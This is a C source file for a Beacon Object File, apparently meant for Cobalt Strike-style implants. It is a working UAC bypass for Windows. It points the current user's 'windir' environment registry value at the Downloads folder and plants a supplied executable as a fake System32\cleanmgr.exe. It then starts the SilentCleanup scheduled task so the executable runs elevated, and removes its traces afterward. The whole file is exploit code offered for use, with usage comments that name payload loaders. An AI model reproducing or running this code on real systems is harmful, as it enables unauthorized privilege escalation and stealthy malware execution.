// x86_64-w64-mingw32-gcc -c SilentCleanupWinDirBOF_OnDiskFile.c -w -o /share/test.o
// Usage: .\COFFLoader64.exe go .\test.o 2f0000002b000000433a5c55736572735c72616e64795c4465736b746f705c746573745c6d657373616765626f782e65786500
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <taskschd.h>
#include <sddl.h>
#include "beacon.h"

// define required winapi functions
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCTSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCTSTR, LPCTSTR, BOOL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI wchar_t WINAPI MSVCRT$wcscat(wchar_t * destination, const wchar_t * source);
WINBASEAPI LPSTR WINAPI MSVCRT$strcat(char *strDestination, const char *strSource);
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI char * __cdecl MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyA(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteTreeA(HKEY base, LPCSTR subkey);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSaveKeyExA(HKEY hKey,LPCSTR lpFile,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD Flags);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,CONST BYTE *lpData,DWORD cbData);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult);
DECLSPEC_IMPORT WINBASEAPI BOOLEAN WINAPI ADVAPI32$GetUserNameA(LPSTR lpNameBuffer, LPDWORD nSize);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR lpFileName);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCTSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
DECLSPEC_IMPORT WINBASEAPI void WINAPI OLEAUT32$VariantInit(VARIANTARG *pvarg);
DECLSPEC_IMPORT WINBASEAPI HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
DECLSPEC_IMPORT WINBASEAPI void * WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINOLEAPI_(void) OLE32$CoUninitialize(void);
DECLSPEC_IMPORT WINOLEAUTAPI_(BSTR) OLEAUT32$SysAllocString(const OLECHAR *);
WINBASEAPI HRESULT WINAPI OLE32$CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);
DECLSPEC_IMPORT WINBASEAPI void WINAPI OLEAUT32$SysFreeString(BSTR);

DWORD runTask(const wchar_t * taskname)
{
    HRESULT hr = S_OK;
    VARIANT VNull;
    ITaskFolder *pRootFolder = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    IRunningTask* pRunningTask = NULL;
    BSTR rootpath = NULL;
    BSTR taskpath = NULL;
    IID CTaskScheduler = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x45,0x72,0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
    ITaskService *pService = NULL;
    // Initialize variants
    OLEAUT32$VariantInit(&VNull);
    
    // Initialize COM
    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if(FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not initialize com (%lX)\n", hr);
        goto runTask_end;
    }

    // Get an instance of the task scheduler
    hr = OLE32$CoCreateInstance( &CTaskScheduler,
                           NULL,
                           CLSCTX_INPROC_SERVER,
                           &IIDTaskService,
                           (void**)&pService ); 
    if(FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create Task Scheduler interface (%lX)\n", hr);
        goto runTask_end;
    }

    // Connect to the server
    hr = pService->lpVtbl->Connect(pService, VNull, VNull, VNull, VNull);
    if(FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to connect to requested target (%lX)\n", hr);
        goto runTask_end;
    }

    // Now we need to get the root folder 
    rootpath = OLEAUT32$SysAllocString(L"\\");
    if(NULL == rootpath)
    {
        hr = ERROR_OUTOFMEMORY;
        BeaconPrintf(CALLBACK_ERROR, "SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }
    hr = pService->lpVtbl->GetFolder(pService, rootpath, &pRootFolder);
    if(FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get the root folder (%lX)\n", hr);
        goto runTask_end;
    }

    // Get the task name or current folder name
    taskpath = OLEAUT32$SysAllocString(taskname);
    if(NULL == taskpath)
    {
        hr = ERROR_OUTOFMEMORY;
        BeaconPrintf(CALLBACK_ERROR, "SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }

    // Get a reference to the target task
    hr = pRootFolder->lpVtbl->GetTask(pRootFolder, taskpath, &pRegisteredTask);
    if(FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find the task: %S (%lX)\n", taskpath, hr);
        BeaconPrintf(CALLBACK_ERROR, "You must specify the full path and name of the task\n");
        goto runTask_end;
    }

    // Actually run the task
    hr = pRegisteredTask->lpVtbl->RunEx(pRegisteredTask, VNull, 2, 0, NULL, &pRunningTask);
    if(FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to run the task: %S (%lX)\n", taskpath, hr);
        goto runTask_end;
    }


runTask_end:
    if(taskpath)
    {
        OLEAUT32$SysFreeString(taskpath);
        taskpath = NULL;
    }

    if(rootpath)
    {
        OLEAUT32$SysFreeString(rootpath);
        rootpath = NULL;
    }

    if(pRegisteredTask)
    {
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
        pRegisteredTask = NULL;
    }

    if(pRootFolder)
    {
        pRootFolder->lpVtbl->Release(pRootFolder);
        pRootFolder = NULL;
    }

    if(pService)
    {
        pService->lpVtbl->Release(pService);
        pService = NULL;
    }

    OLE32$CoUninitialize();

    return (DWORD)hr;
}

int go(char * args, unsigned long length) {

    // get arguments
    datap parser;
    BeaconDataParse(&parser, args, length);
    unsigned char * cmdPath = BeaconDataExtract(&parser, NULL);

    char targetExePath[MAX_PATH] = {0};
    MSVCRT$strcpy(targetExePath, cmdPath);

    BeaconPrintf(CALLBACK_OUTPUT, "targetExePath: %s\n", targetExePath);

    // Get current username and set the tempPath to the current user's Downloads directory
    // If the current username is not found or the path is invalid, use 'C:\Users\Public\Downloads\' instead
    char tempPath[MAX_PATH] = "C:\\Users\\";
    char username[257];
    DWORD username_len = 257;
    BOOL success = ADVAPI32$GetUserNameA(username, &username_len);
    //BOOL success = 0; // test GetUserName failure
    if (success) {
        MSVCRT$strcat(tempPath, username);
        MSVCRT$strcat(tempPath, "\\Downloads");
        DWORD attributes = KERNEL32$GetFileAttributesA(tempPath);
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            BeaconPrintf(CALLBACK_ERROR, "Path based on current username is invalid: %d\n", KERNEL32$GetLastError());
            MSVCRT$strcpy(tempPath, "C:\\Users\\Public\\Downloads");
            BeaconPrintf(CALLBACK_OUTPUT, "Using the following path instead: %s\n", tempPath);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get current username: %d\n", KERNEL32$GetLastError());
        MSVCRT$strcat(tempPath, "Public\\Downloads");
        BeaconPrintf(CALLBACK_OUTPUT, "Using the following path instead: %s\n", tempPath);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Writing temporary files to: %s\n", tempPath);

    // define and format required strings
    char tempSystem32[100] = {0};
    char targetBinLocation[100] = {0};
    MSVCRT$strcat(tempSystem32, tempPath);
    MSVCRT$strcat(tempSystem32, "\\System32");
    MSVCRT$strcat(targetBinLocation, tempSystem32);
    MSVCRT$strcat(targetBinLocation, "\\cleanmgr.exe");
    //BeaconPrintf(CALLBACK_OUTPUT, "targetBinLocation: %s\n", targetBinLocation);

    // Create temp System32 directory
    BOOL test = KERNEL32$CreateDirectoryA(tempSystem32, NULL);
    if (test == 0 && KERNEL32$GetLastError() != 183) {
        BeaconPrintf(CALLBACK_ERROR, "Error creating new System32 directory\n");
        return 1;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully created new System32 directory\n");
    }

    // Copy supplied EXE to target location
    int result = KERNEL32$CopyFileA(targetExePath, targetBinLocation, FALSE);
    if (result != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully copied target binary to temp System32 directory\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to copy target binary to temp System32 directory! Exiting.\n");
        goto FileCleanup;
    }

    // Create windir reg key and/or open handle to it
    HKEY attackKey;
    if(ADVAPI32$RegCreateKeyA(HKEY_CURRENT_USER, "Environment", &attackKey)!=ERROR_SUCCESS) return 1;

    // set windir reg key to writable dir
    LSTATUS regStatus = ADVAPI32$RegSetValueExA(attackKey, "windir", 0, REG_SZ, tempPath, MSVCRT$strlen(tempPath));
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error setting windir registry key!: %d\n", regStatus);
        goto FileCleanup;
    }

    // Execute the 'SilentCleanup' scheduled task
    DWORD runTaskRet = runTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
    if (runTaskRet != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to execute SilentCleanup scheduled task!: %d\n", runTaskRet);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully executed SilentCleanup scheduled task!\n");
    }

    // reset windir key to it's default value
    char ogWinDir[MAX_PATH] = "C:\\Windows";
    regStatus = ADVAPI32$RegSetValueExA(attackKey, "windir", 0, REG_SZ, ogWinDir, MSVCRT$strlen(ogWinDir));
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error setting windir registry key!: %d\n", regStatus);
    }

    // close handle to reg key
    ADVAPI32$RegCloseKey(attackKey);

    // Set this sleep to be for however long the EXE will execute for. 30 seconds is a good standard for use with something like Shhhloader.
    KERNEL32$Sleep(30000);

    FileCleanup:
    // delete exe from created directory
    result = KERNEL32$DeleteFileA(targetBinLocation);
    if (result != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "File deleted succesfully: %s\n", targetBinLocation);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to delete '%s' in the fake windows folder: %d\n", targetBinLocation, KERNEL32$GetLastError());
    }

    // delete created directory
    result = KERNEL32$RemoveDirectoryA(tempSystem32);
    if (result != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Folder deleted succesfully: %s\n", tempSystem32);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to delete folder %s: %d\n", tempSystem32, KERNEL32$GetLastError());
    }

    return 0;
}